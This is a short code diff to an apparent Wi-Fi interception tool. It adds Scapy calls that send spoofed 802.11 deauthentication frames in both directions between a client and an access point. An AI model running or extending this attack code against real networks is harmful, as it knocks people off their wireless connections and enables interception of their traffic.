@@ -171,6 +171,10 @@ class Interceptor:
                           Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                           deauth_frm,
                           iface=self.interface)
+                    sendp(rd_frm /
+                          Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac) /
+                          deauth_frm,
+                          iface=self.interface)
             sleep(self._deauth_intv)
 
     def run(self):
